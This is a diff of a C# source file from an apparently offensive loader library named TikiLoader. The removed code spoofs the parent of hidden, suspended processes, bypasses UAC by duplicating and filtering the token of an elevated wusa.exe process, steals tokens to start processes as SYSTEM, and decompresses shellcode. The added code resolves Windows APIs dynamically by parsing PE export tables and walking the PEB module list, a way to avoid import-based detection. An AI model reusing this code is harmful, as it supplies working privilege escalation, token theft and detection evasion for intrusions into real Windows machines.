@@ -1,202 +1,272 @@
 ﻿using System;
-using System.IO;
+using System.Collections.Generic;
 using System.Diagnostics;
-using System.IO.Compression;
+using System.IO;
 using System.Runtime.InteropServices;
-
-using static TikiLoader.Imports;
-using static TikiLoader.Enums;
-using static TikiLoader.Structs;
 
 namespace TikiLoader
 {
-    public class Generic
+    public static class Generic
     {
-        private const int ProcThreadAttributeParentProcess = 0x00020000;
-
-        public static PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
+        public static object DynamicApiInvoke(string dllName, string functionName, Type functionDelegateType, ref object[] parameters, bool canLoadFromDisk = false, bool resolveForwards = true)
         {
-            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
-            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+            var pFunction = GetLibraryAddress(dllName, functionName, canLoadFromDisk, resolveForwards);
+            return DynamicFunctionInvoke(pFunction, functionDelegateType, ref parameters);
+        }
+        
+        private static object DynamicFunctionInvoke(IntPtr functionPointer, Type functionDelegateType, ref object[] parameters)
+        {
+            var funcDelegate = Marshal.GetDelegateForFunctionPointer(functionPointer, functionDelegateType);
+            return funcDelegate.DynamicInvoke(parameters);
+        }
+        
+        private static IntPtr GetLibraryAddress(string dllName, string functionName, bool canLoadFromDisk = false, bool resolveForwards = true)
+        {
+            var hModule = GetLoadedModuleAddress(dllName);
+            
+            if (hModule == IntPtr.Zero && canLoadFromDisk)
+            {
+                hModule = LoadModuleFromDisk(dllName);
+                
+                if (hModule == IntPtr.Zero)
+                {
+                    throw new FileNotFoundException(dllName + ", unable to find the specified file.");
+                }
+            }
+            else if (hModule == IntPtr.Zero)
+            {
+                throw new DllNotFoundException(dllName + ", Dll was not found.");
+            }
 
-            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
-            IntPtr lpValue = IntPtr.Zero;
+            return GetExportAddress(hModule, functionName, resolveForwards);
+        }
+        
+        private static IntPtr GetLoadedModuleAddress(string dllName)
+        {
+            var modules = Process.GetCurrentProcess().Modules;
+            
+            foreach (ProcessModule module in modules)
+                if (module.FileName.ToLower().EndsWith(dllName.ToLower()))
+                    return module.BaseAddress;
 
+            return IntPtr.Zero;
+        }
+        
+        public static IntPtr LoadModuleFromDisk(string dllPath)
+        {
+            var uModuleName = new Data.Native.UNICODE_STRING();
+            Native.RtlInitUnicodeString(ref uModuleName, dllPath);
+
+            var hModule = IntPtr.Zero;
+            _ = Native.LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
+
+            return hModule;
+        }
+        
+        public static IntPtr GetExportAddress(IntPtr moduleBase, string exportName, bool resolveForwards = true)
+        {
+            var functionPtr = IntPtr.Zero;
+            
             try
             {
-                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
-                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
-                pSec.nLength = Marshal.SizeOf(pSec);
-                tSec.nLength = Marshal.SizeOf(tSec);
+                // Traverse the PE header in memory
+                var peHeader = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + 0x3C));
+                var optHeader = moduleBase.ToInt64() + peHeader + 0x18;
+                var magic = Marshal.ReadInt16((IntPtr)optHeader);
+                long pExport = 0;
+                
+                if (magic == 0x010b) pExport = optHeader + 0x60;
+                else pExport = optHeader + 0x70;
 
-                CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow | CreationFlags.ExtendedStartupInfoPresent;
+                // Read -> IMAGE_EXPORT_DIRECTORY
+                var exportRva = Marshal.ReadInt32((IntPtr)pExport);
+                var ordinalBase = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x10));
+                var numberOfNames = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x18));
+                var functionsRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x1C));
+                var namesRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x20));
+                var ordinalsRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x24));
 
-                IntPtr lpSize = IntPtr.Zero;
-
-                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
-                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
-
-                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
-                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
-                Marshal.WriteIntPtr(lpValue, parentHandle);
-
-                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
-
-                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
-
-                return pInfo;
-
+                // Loop the array of export name RVA's
+                for (var i = 0; i < numberOfNames; i++)
+                {
+                    var functionName = Marshal.PtrToStringAnsi((IntPtr)(moduleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + namesRva + i * 4))));
+                    
+                    if (string.IsNullOrWhiteSpace(functionName)) continue;
+                    if (!functionName.Equals(exportName, StringComparison.OrdinalIgnoreCase)) continue;
+                    
+                    var functionOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;
+                    var functionRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRva + (4 * (functionOrdinal - ordinalBase))));
+                    functionPtr = (IntPtr)((long)moduleBase + functionRva);
+                        
+                    if (resolveForwards) functionPtr = GetForwardAddress(functionPtr);
+                    break;
+                }
             }
-            finally
+            catch
             {
-                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
-                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
-                Marshal.FreeHGlobal(lpValue);
+                throw new InvalidOperationException("Failed to parse module exports.");
             }
-        }
 
-        public static PROCESS_INFORMATION StartProcessWOPid(string targetProcess)
-        {
-            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
-            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
-
-            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
-            IntPtr lpValue = IntPtr.Zero;
-
-            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
-            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
-            pSec.nLength = Marshal.SizeOf(pSec);
-            tSec.nLength = Marshal.SizeOf(tSec);
-
-            CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcesds | CreationFlags.CreateNoWindow;
-
-            CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
-
-            return pInfo;
-
-        }
-
-        public static PROCESS_INFORMATION StartProcessAs(string path, string domain, string username, string password)
-        {
-            STARTUPINFO startInfo = new STARTUPINFO();
-            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
-
-            CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.CreateNoWindow;
-            CreateProcessWithLogonW(username, domain, password, LogonFlags.LogonWithProfile, path, "", flags, (uint)0, @"C:\Windows\System32", ref startInfo, out procInfo);
-
-            return procInfo;
-        }
-
-        public static PROCESS_INFORMATION StartElevatedProcess(string binary, [Optional]int elevatedPID)
-        {
-            IntPtr hProcess = IntPtr.Zero;
-
-            if (elevatedPID > 0)
+            if (functionPtr == IntPtr.Zero)
             {
-                hProcess = OpenProcess(0x00001000, false, elevatedPID);
+                throw new MissingMethodException(exportName + ", export not found.");
+            }
+            
+            return functionPtr;
+        }
+        
+        private static IntPtr GetForwardAddress(IntPtr exportAddress, bool canLoadFromDisk = false)
+        {
+            var functionPtr = exportAddress;
+            
+            try
+            {
+                // Assume it is a forward. If it is not, we will get an error
+                var forwardNames = Marshal.PtrToStringAnsi(functionPtr);
+                if (string.IsNullOrWhiteSpace(forwardNames)) return functionPtr;
+                
+                var values = forwardNames.Split('.');
+
+                if (values.Length > 1)
+                {
+                    var forwardModuleName = values[0];
+                    var forwardExportName = values[1];
+
+                    // Check if it is an API Set mapping
+                    var apiSet = GetApiSetMapping();
+                    var lookupKey = forwardModuleName.Substring(0, forwardModuleName.Length - 2) + ".dll";
+                    
+                    if (apiSet.ContainsKey(lookupKey)) forwardModuleName = apiSet[lookupKey];
+                    else forwardModuleName += ".dll";
+
+                    var hModule = GetPebLdrModuleEntry(forwardModuleName);
+                    
+                    if (hModule == IntPtr.Zero && canLoadFromDisk)
+                        hModule = LoadModuleFromDisk(forwardModuleName);
+                    
+                    if (hModule != IntPtr.Zero)
+                        functionPtr = GetExportAddress(hModule, forwardExportName);
+                }
+            }
+            catch
+            {
+                // Do nothing, it was not a forward
+            }
+            
+            return functionPtr;
+        }
+        
+        public static IntPtr GetPebLdrModuleEntry(string dllName)
+        {
+            // Get _PEB pointer
+            var pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));
+
+            // Set function variables
+            uint ldrDataOffset = 0;
+            uint inLoadOrderModuleListOffset = 0;
+            
+            if (IntPtr.Size == 4)
+            {
+                ldrDataOffset = 0xc;
+                inLoadOrderModuleListOffset = 0xC;
             }
             else
             {
-                SHELLEXECUTEINFO shellInfo = new SHELLEXECUTEINFO();
-
-                shellInfo.cbSize = Marshal.SizeOf(shellInfo);
-                shellInfo.fMask = 0x40;
-                shellInfo.lpFile = "wusa.exe";
-                shellInfo.nShow = 0x0;
-
-                ShellExecuteEx(ref shellInfo);
-
-                hProcess = shellInfo.hProcess;
+                ldrDataOffset = 0x18;
+                inLoadOrderModuleListOffset = 0x10;
             }
 
-            IntPtr hToken = IntPtr.Zero;
-            OpenProcessToken(hProcess, 0x02000000, ref hToken);
+            // Get module InLoadOrderModuleList -> _LIST_ENTRY
+            var pebLdrData = Marshal.ReadIntPtr((IntPtr)((ulong)pbi.PebBaseAddress + ldrDataOffset));
+            var pInLoadOrderModuleList = (IntPtr)((ulong)pebLdrData + inLoadOrderModuleListOffset);
+            var le = (Data.Native.LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(Data.Native.LIST_ENTRY));
 
-            IntPtr hNewToken = IntPtr.Zero;
-            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();
-
-            DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken);
-
-            SID_IDENTIFIER_AUTHORITY sia = new SID_IDENTIFIER_AUTHORITY();
-            sia.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };
-
-            IntPtr pSID = IntPtr.Zero;
-            AllocateAndInitializeSid(ref sia, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, ref pSID);
-
-            SID_AND_ATTRIBUTES saa = new SID_AND_ATTRIBUTES();
-            saa.Sid = pSID;
-            saa.Attributes = 0x20;
-
-            TOKEN_MANDATORY_LABEL tml = new TOKEN_MANDATORY_LABEL();
-            tml.Label = saa;
-            int tmlSize = Marshal.SizeOf(tml);
-            NtSetInformationToken(hNewToken, 25, ref tml, tmlSize);
-
-            IntPtr luaToken = IntPtr.Zero;
-            NtFilterToken(hNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken);
-
-            hNewToken = IntPtr.Zero;
-            secAttribs = new SECURITY_ATTRIBUTES();
-
-            DuplicateTokenEx(luaToken, 0xc, ref secAttribs, 2, 2, ref hNewToken);
-
-            ImpersonateLoggedOnUser(hNewToken);
-
-            STARTUPINFO sInfo = new STARTUPINFO();
-            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
-
-            CreateProcessWithLogonW("xxx", "xxx", "xxx", LogonFlags.LogonNetCredentialsOnly, binary, "", CreationFlags.CreateSuspended, 0, @"C:\Windows\System32", ref sInfo, out pInfo);
-
-            if (elevatedPID == 0)
-                TerminateProcess(hProcess, 1);
-
-            return pInfo;
-        }
-
-        public static PROCESS_INFORMATION StartProcessAsSystem(string binary, int duplicatePid)
-        {
-            IntPtr hProcess = OpenProcess(0x00001000, false, duplicatePid);
-
-            IntPtr hToken = IntPtr.Zero;
-            OpenProcessToken(hProcess, 0x02000000, ref hToken);
-
-            IntPtr hNewToken = IntPtr.Zero;
-            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();
-            DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken);
-
-            STARTUPINFO sInfo = new STARTUPINFO();
-            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
-
-            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
-            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
-
-            CreateProcessAsUser(hNewToken, binary, "", ref pSec, ref tSec, false, CreationFlags.CreateSuspended, IntPtr.Zero, @"C:\Windows\System32", ref sInfo, out pInfo);
-
-            return pInfo;
-        }
-
-        public static byte[] DecompressShellcode(byte[] gzip)
-        {
-            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
+            // Loop entries
+            var flink = le.Flink;
+            var hModule = IntPtr.Zero;
+            var dte = (Data.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Data.PE.LDR_DATA_TABLE_ENTRY));
+            while (dte.InLoadOrderLinks.Flink != le.Blink)
             {
-                const int size = 4096;
-                byte[] buffer = new byte[size];
-                using (MemoryStream memory = new MemoryStream())
-                {
-                    int count = 0;
-                    do
-                    {
-                        count = stream.Read(buffer, 0, size);
-                        if (count > 0)
-                        {
-                            memory.Write(buffer, 0, count);
-                        }
-                    }
-                    while (count > 0);
-                    return memory.ToArray();
-                }
+                // Match module name
+                var fullName = Marshal.PtrToStringUni(dte.FullDllName.Buffer);
+                if (string.IsNullOrWhiteSpace(fullName)) continue;
+                
+                if (fullName.EndsWith(dllName, StringComparison.OrdinalIgnoreCase))
+                    hModule = dte.DllBase;
+
+                // Move Ptr
+                flink = dte.InLoadOrderLinks.Flink;
+                dte = (Data.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Data.PE.LDR_DATA_TABLE_ENTRY));
             }
+
+            return hModule;
+        }
+        
+        private static Dictionary<string, string> GetApiSetMapping()
+        {
+            var pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));
+            var apiSetMapOffset = IntPtr.Size == 4 ? (uint)0x38 : 0x68;
+
+            // Create mapping dictionary
+            var apiSetDict = new Dictionary<string, string>();
+
+            var pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((ulong)pbi.PebBaseAddress + apiSetMapOffset));
+            var apiSetNamespace = (Data.PE.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(Data.PE.ApiSetNamespace));
+            
+            for (var i = 0; i < apiSetNamespace.Count; i++)
+            {
+                var setEntry = new Data.PE.ApiSetNamespaceEntry();
+
+                var pSetEntry = (IntPtr)((ulong)pApiSetNamespace + (ulong)apiSetNamespace.EntryOffset + (ulong)(i * Marshal.SizeOf(setEntry)));
+                setEntry = (Data.PE.ApiSetNamespaceEntry)Marshal.PtrToStructure(pSetEntry, typeof(Data.PE.ApiSetNamespaceEntry));
+
+                var apiSetEntryName = Marshal.PtrToStringUni((IntPtr)((ulong)pApiSetNamespace + (ulong)setEntry.NameOffset), setEntry.NameLength / 2);
+                var apiSetEntryKey = apiSetEntryName.Substring(0, apiSetEntryName.Length - 2) + ".dll" ; // Remove the patch number and add .dll
+
+                var setValue = new Data.PE.ApiSetValueEntry();
+                var pSetValue = IntPtr.Zero;
+
+                switch (setEntry.ValueLength)
+                {
+                    // If there is only one host, then use it
+                    case 1:
+                        pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)setEntry.ValueOffset);
+                        break;
+                    
+                    case > 1:
+                    {
+                        // Loop through the hosts until we find one that is different from the key, if available
+                        for (var j = 0; j < setEntry.ValueLength; j++)
+                        {
+                            var host = (IntPtr)((ulong)pApiSetNamespace + (ulong)setEntry.ValueOffset + (ulong)Marshal.SizeOf(setValue) * (ulong)j);
+                            if (Marshal.PtrToStringUni(host) != apiSetEntryName)
+                                pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)setEntry.ValueOffset + (ulong)Marshal.SizeOf(setValue) * (ulong)j);
+                        }
+                        
+                        // If there is not one different from the key, then just use the key and hope that works
+                        if (pSetValue == IntPtr.Zero)
+                            pSetValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)setEntry.ValueOffset);
+                        
+                        break;
+                    }
+                }
+
+                // Get the host DLL's name from the entry
+                setValue = (Data.PE.ApiSetValueEntry)Marshal.PtrToStructure(pSetValue, typeof(Data.PE.ApiSetValueEntry));
+                
+                var apiSetValue = string.Empty;
+                if (setValue.ValueCount != 0)
+                {
+                    var pValue = (IntPtr)((ulong)pApiSetNamespace + (ulong)setValue.ValueOffset);
+                    apiSetValue = Marshal.PtrToStringUni(pValue, setValue.ValueCount / 2);
+                }
+
+                // Add pair to dict
+                apiSetDict.Add(apiSetEntryKey, apiSetValue);
+            }
+
+            // Return dict
+            return apiSetDict;
         }
     }
 }
